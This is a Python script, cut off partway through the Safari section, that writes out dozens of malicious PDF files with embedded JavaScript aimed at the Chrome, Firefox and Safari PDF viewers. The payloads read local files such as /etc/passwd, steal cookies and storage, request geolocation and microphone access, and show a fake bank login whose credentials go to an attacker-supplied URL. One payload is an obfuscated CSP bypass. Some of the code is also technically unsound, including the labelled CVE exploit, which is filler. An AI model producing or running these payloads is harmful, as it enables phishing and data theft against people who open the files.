#!/usr/bin/env python3

import argparse
import os
import sys
from datetime import datetime

# Current timestamp and user information
TIMESTAMP = "2025-07-27 06:19:07"
USER = "SNGWN"

# PDF version specifications
PDF_VERSIONS = {
    "1.0": {"features": ["basic"], "header": "%PDF-1.0"},
    "1.1": {"features": ["basic"], "header": "%PDF-1.1"},
    "1.2": {"features": ["basic"], "header": "%PDF-1.2"},
    "1.3": {"features": ["basic"], "header": "%PDF-1.3"},
    "1.4": {"features": ["basic", "transparency"], "header": "%PDF-1.4"},
    "1.5": {"features": ["basic", "transparency", "objectstreams"], "header": "%PDF-1.5"},
    "1.6": {"features": ["basic", "transparency", "objectstreams", "3d"], "header": "%PDF-1.6"},
    "1.7": {"features": ["basic", "transparency", "objectstreams", "3d", "rich"], "header": "%PDF-1.7"},
    "2.0": {"features": ["basic", "transparency", "objectstreams", "3d", "rich", "modern"], "header": "%PDF-2.0"}
}

def create_directory(directory):
    """Create a directory if it doesn't exist."""
    if not os.path.exists(directory):
        os.makedirs(directory)

def write_pdf(filename, content, description, pdf_version):
    """Write PDF content to file with description as comment."""
    # Replace the PDF version header in the content
    content = content.replace("%PDF-1.7", PDF_VERSIONS[pdf_version]["header"])
    
    with open(filename, 'w') as f:
        f.write(f"""# {description}
# Generated on: {TIMESTAMP} UTC
# User: {USER}
# PDF Version: {pdf_version}
{content}""")
    print(f"Created {filename} (PDF Version {pdf_version})")

def generate_chrome_payloads(url, output_dir, pdf_version):
    """Generate Chrome-specific PDF XSS payloads."""
    create_directory(output_dir)
    
    # Payload 1: Basic PDF with JavaScript execution
    payload1 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
4 0 obj
<</Length 67>>
stream
<html><script>
alert(document.domain);
</script></html>
endstream
endobj
5 0 obj
<</Type/Action/S/JavaScript/JS(
app.alert("XSS in Chrome PDF Viewer");
try {{ app.doc.exportDataObject({{cName: "test.html", nLaunch: 2}}); }} catch(e) {{ app.alert(e); }}
)>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
0000000211 00000 n
0000000328 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/chrome_basic_js_execution.pdf", payload1, 
              "Basic PDF with JavaScript execution in Chrome", pdf_version)
    
    # Payload 2: Chrome PDF viewer sandbox escape
    payload2 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/JavaScript/JS(
this.submitForm({{cURL: "javascript:fetch('file:///etc/passwd').then(r=>r.text()).then(t=>navigator.sendBeacon('{url}/exfil',t))", cSubmitAs: "PDF"}});
)>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/chrome_sandbox_escape.pdf", payload2, 
              "Chrome PDF viewer sandbox escape to read local files and exfiltrate to attacker URL", pdf_version)
    
    # Payload 3: Chrome PDF viewer DOM access
    payload3 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/JavaScript/JS(
try {{
  app.alert("XSS via PDF in Chrome");
  app.launchURL("javascript:alert(document.cookie)", true);
}} catch(e) {{ app.alert(e); }}
)>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/chrome_dom_access.pdf", payload3, 
              "Chrome PDF viewer DOM access to extract cookies", pdf_version)
    
    # Payload 4: Chrome PDF URI scheme handler abuse
    payload4 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:fetch('{url}/steal?cookie='+document.cookie))>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/chrome_uri_scheme_abuse.pdf", payload4, 
              "Chrome PDF URI scheme handler abuse to exfiltrate cookies", pdf_version)

    # Payload 5: Chrome CVE-2020-6418 exploit
    payload5 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/JavaScript/JS(
try {{
  var arr = [];
  var filler = "AAAA";
  for(var i = 0; i < 0x10000; i++) {{ arr.push(filler); }}
  arr.length = 0xffff;
  var obj = {{}};
  obj.toString = function() {{ arr = null; return "A"; }};
  arr[0] = obj;
  var str = arr.join("");
  var payload = "alert(document.domain)";
  eval(payload);
}} catch(e) {{ app.alert(e); }}
)>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/chrome_cve_2020_6418.pdf", payload5, 
              "Chrome CVE-2020-6418 vulnerability exploit in PDF context", pdf_version)

    # Payload 6: Chrome iframe escape
    payload6 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/JavaScript/JS(
try {{
  app.launchURL("javascript:top.document.body.innerHTML='<iframe src=\"javascript:alert(top.document.domain)\"></iframe>';", false);
}} catch(e) {{ app.alert(e); }}
)>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/chrome_iframe_escape.pdf", payload6, 
              "Chrome iframe escape technique to execute JavaScript in parent context", pdf_version)

    # Payload 7: Chrome Content-Window access
    payload7 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/JavaScript/JS(
try {{
  app.launchURL("javascript:window.parent.document.write('<script>alert(document.domain)</script>')", false);
}} catch(e) {{ app.alert(e); }}
)>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/chrome_content_window_access.pdf", payload7, 
              "Chrome Content-Window access to write to parent document", pdf_version)

    # Payload 8: Chrome Renderer Process exploit
    payload8 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/JavaScript/JS(
try {{
  var payload = "var xhr = new XMLHttpRequest(); xhr.open('GET', 'file:///etc/passwd', false); xhr.send(null); app.alert(xhr.responseText);";
  app.launchURL("javascript:" + payload, true);
}} catch(e) {{ app.alert(e); }}
)>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/chrome_renderer_process_exploit.pdf", payload8, 
              "Chrome Renderer Process exploit to read local files via XMLHttpRequest", pdf_version)

    # Payload 9: Chrome-specific WebRTC exploitation
    payload9 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/JavaScript/JS(
try {{
  app.launchURL("javascript:navigator.mediaDevices.getUserMedia({{audio:true}}).then(stream=>{{fetch('{url}/microphone?access=granted')}}).catch(e=>{{fetch('{url}/microphone?error='+encodeURIComponent(e))}})", true);
}} catch(e) {{ app.alert(e); }}
)>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/chrome_webrtc_exploitation.pdf", payload9, 
              "Chrome-specific WebRTC exploitation to access microphone", pdf_version)

    # Payload 10: Chrome Notification API
    payload10 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/JavaScript/JS(
try {{
  app.launchURL("javascript:Notification.requestPermission().then(permission=>{{if(permission==='granted'){{new Notification('XSS via PDF',{{body:'Your browser has been compromised'}});fetch('{url}/notification?status=granted')}}}})", true);
}} catch(e) {{ app.alert(e); }}
)>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/chrome_notification_api.pdf", payload10, 
              "Chrome Notification API exploit to display system notifications", pdf_version)

    # Payload 11: Chrome Web SQL Database access
    payload11 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/JavaScript/JS(
try {{
  app.launchURL("javascript:var db=openDatabase('testdb','1.0','test',2*1024*1024);db.transaction(function(tx){{tx.executeSql('CREATE TABLE IF NOT EXISTS testdata (id unique, data)');tx.executeSql('INSERT INTO testdata VALUES (1, \"compromised\")');fetch('{url}/websql?status=created')}})", true);
}} catch(e) {{ app.alert(e); }}
)>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/chrome_web_sql_database.pdf", payload11, 
              "Chrome Web SQL Database access to create and modify local databases", pdf_version)

    # Payload 12: Chrome History API exploitation
    payload12 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/JavaScript/JS(
try {{
  app.launchURL("javascript:history.pushState(null,null,'https://fake-bank.com');document.body.innerHTML='<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;\"><h1>Bank Login</h1><form><input type=\"text\" placeholder=\"Username\"><br><input type=\"password\" placeholder=\"Password\"><br><button onclick=\"fetch(\\\"{url}/credentials?u=\\\"+document.querySelector(\\\"input[type=text]\\\").value+\\\"&p=\\\"+document.querySelector(\\\"input[type=password]\\\").value);return false;\">Login</button></form></div>';", true);
}} catch(e) {{ app.alert(e); }}
)>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/chrome_history_api.pdf", payload12, 
              "Chrome History API exploitation for phishing by changing the visible URL", pdf_version)

def generate_firefox_payloads(url, output_dir, pdf_version):
    """Generate Firefox-specific PDF XSS payloads."""
    create_directory(output_dir)
    
    # Payload 1: Basic Firefox PDF.js exploit
    payload1 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:alert(document.domain))>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/firefox_basic_exploit.pdf", payload1, 
              "Basic Firefox PDF.js exploit showing domain in an alert", pdf_version)

    # Payload 2: Firefox PDF.js annotation exploit
    payload2 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Annots[4 0 R]/Resources<<>>>>
endobj
4 0 obj
<</Type/Annot/Subtype/Link/Rect[0 0 612 792]/A 5 0 R>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:eval('try{{throw new Error()}}catch(e){{fetch("{url}/stack?data="+encodeURIComponent(e.stack))}}'))>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000053 00000 n
0000000106 00000 n
0000000202 00000 n
0000000274 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
381
%%EOF"""
    write_pdf(f"{output_dir}/firefox_annotation_exploit.pdf", payload2, 
              "Firefox PDF.js annotation exploit to reveal stack trace information", pdf_version)

    # Payload 3: Firefox PDF.js content extraction
    payload3 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:fetch('file:///etc/passwd').then(r=>r.text()).then(t=>fetch('{url}/exfil?data='+encodeURIComponent(t))))>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/firefox_content_extraction.pdf", payload3, 
              "Firefox PDF.js content extraction to read local system files and exfiltrate to attacker URL", pdf_version)
              
    # Payload 4: Firefox PDF.js viewer DOM manipulation
    payload4 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:document.body.innerHTML='<h1>This PDF has been hacked</h1><img src=x onerror=alert(document.domain)>')>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/firefox_dom_manipulation.pdf", payload4, 
              "Firefox PDF.js viewer DOM manipulation to inject malicious HTML", pdf_version)
              
    # Payload 5: Firefox WebAPI access
    payload5 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:navigator.geolocation.getCurrentPosition(position=>fetch('{url}/geolocation?lat='+position.coords.latitude+'&lon='+position.coords.longitude)))>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/firefox_webapi_access.pdf", payload5, 
              "Firefox WebAPI access to get user's geolocation information", pdf_version)
              
    # Payload 6: Firefox PDF.js worker exploit
    payload6 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:(function(){{var f=document.createElement('iframe');f.src='javascript:fetch(`{url}/steal?cookie=${{document.cookie}}`)';document.body.appendChild(f);}}())>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/firefox_worker_exploit.pdf", payload6, 
              "Firefox PDF.js worker exploit to create an iframe for cookie exfiltration", pdf_version)
              
    # Payload 7: Firefox IndexedDB exploit
    payload7 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:var request=indexedDB.open('malicious',1);request.onupgradeneeded=function(e){{var db=e.target.result;var store=db.createObjectStore('data',{{keyPath:'id'}});store.add({{id:1,value:'compromised'}});fetch('{url}/indexeddb?status=created');}})>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/firefox_indexeddb_exploit.pdf", payload7, 
              "Firefox IndexedDB exploit to create and modify client-side databases", pdf_version)
              
    # Payload 8: Firefox sessionStorage manipulation
    payload8 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:sessionStorage.setItem('userAuth','compromised');fetch('{url}/sessionstorage?data='+sessionStorage.getItem('userAuth')))>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/firefox_sessionstorage.pdf", payload8, 
              "Firefox sessionStorage manipulation to compromise session data", pdf_version)
              
    # Payload 9: Firefox form data manipulation
    payload9 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:document.body.innerHTML='<form id="malicious"><input name="username" value="admin"><input type="password" name="password" value="password123"></form>';var data=document.getElementById('malicious').elements;fetch('{url}/form-data?u='+data.username.value+'&p='+data.password.value))>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/firefox_form_data.pdf", payload9, 
              "Firefox form data manipulation to create and exfiltrate fake credentials", pdf_version)
              
    # Payload 10: Firefox SVG payload in PDF
    payload10 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:document.body.innerHTML='<svg onload="fetch(\\'{url}/svg?domain=\\'+document.domain)"><script>alert(2)</script></svg>')>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/firefox_svg_payload.pdf", payload10, 
              "Firefox SVG payload in PDF to execute JavaScript via SVG onload event", pdf_version)
              
    # Payload 11: Firefox PDF.js URL parsing exploit
    payload11 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript://comment%0Afetch('{url}/url-parsing?domain='+document.domain))>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/firefox_url_parsing.pdf", payload11, 
              "Firefox PDF.js URL parsing exploit using JavaScript comments to bypass filters", pdf_version)
              
    # Payload 12: Firefox CSP bypass
    payload12 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:eval(String.fromCharCode(102,101,116,99,104,40,39,{url}/csp-bypass?domain=39,43,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41)))>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/firefox_csp_bypass.pdf", payload12, 
              "Firefox CSP bypass using String.fromCharCode to evade content security policy", pdf_version)

def generate_safari_payloads(url, output_dir, pdf_version):
    """Generate Safari-specific PDF XSS payloads."""
    create_directory(output_dir)
    
    # Payload 1: Basic Safari WebKit PDF renderer exploit
    payload1 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:alert(document.domain))>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/safari_basic_exploit.pdf", payload1, 
              "Basic Safari WebKit PDF renderer exploit to display domain in alert", pdf_version)

    # Payload 2: Safari WebKit DOM access
    payload2 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:document.body.innerHTML='<img src=x onerror=fetch("{url}/dom?cookie="+document.cookie)>')>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/safari_dom_access.pdf", payload2, 
              "Safari WebKit DOM access to steal cookies via HTML injection", pdf_version)

    # Payload 3: Safari WebKit data URI exploit
    payload3 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly97dXJsfS9kYXRhP2RvbWFpbj0nK2RvY3VtZW50LmRvbWFpbik7PC9zY3JpcHQ+)>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/safari_data_uri.pdf", payload3, 
              "Safari WebKit data URI exploit to execute JavaScript via base64 encoded HTML", pdf_version)

    # Payload 4: Safari localStorage access
    payload4 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:localStorage.setItem('pwned','true');fetch('{url}/storage?data='+localStorage.getItem('pwned')))>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/safari_localstorage.pdf", payload4, 
              "Safari localStorage access to store and exfiltrate persistent data", pdf_version)

    # Payload 5: Safari WebKit iframe injection
    payload5 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:document.body.innerHTML='<iframe src="javascript:fetch(\\'{url}/iframe?domain=\\'+parent.document.domain)"></iframe>')>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/safari_iframe_injection.pdf", payload5, 
              "Safari WebKit iframe injection to execute JavaScript in parent context", pdf_version)

    # Payload 6: Safari WebKit event handlers
    payload6 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:document.body.innerHTML='<body onload="fetch(\\'{url}/event?domain=\\'+document.domain)"></body>')>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/safari_event_handlers.pdf", payload6, 
              "Safari WebKit event handlers to execute JavaScript on page load", pdf_version)

    # Payload 7: Safari FileSystem API
    payload7 = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
5 0 obj
<</Type/Action/S/URI/URI(javascript:window.webkitRequestFileSystem(window.TEMPORARY, 5*1024*1024, function(fs){{fs.root.getFile('test.txt', {{create:true}}, function(fileEntry){{fileEntry.createWriter(function(fileWriter){{fileWriter.onwriteend=function(){{fetch('{url}/filesystem?status=success')}};var blob=new Blob(['Test data'], {{type:'text/plain'}});fileWriter.write(blob);}})}});}});)>>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000077 00000 n
0000000130 00000 n
trailer
<</Size 6/Root 1 0 R>>
startxref
495
%%EOF"""
    write_pdf(f"{output_dir}/safari_filesystem_api.pdf", payload7, 
              "Safari FileSystem API exploitation to write files to temporary filesystem", pdf_version)

    # Payload 8: Safari postMessage exploitation
    payload8 = f"""%PDF-1.7
1 0 obj
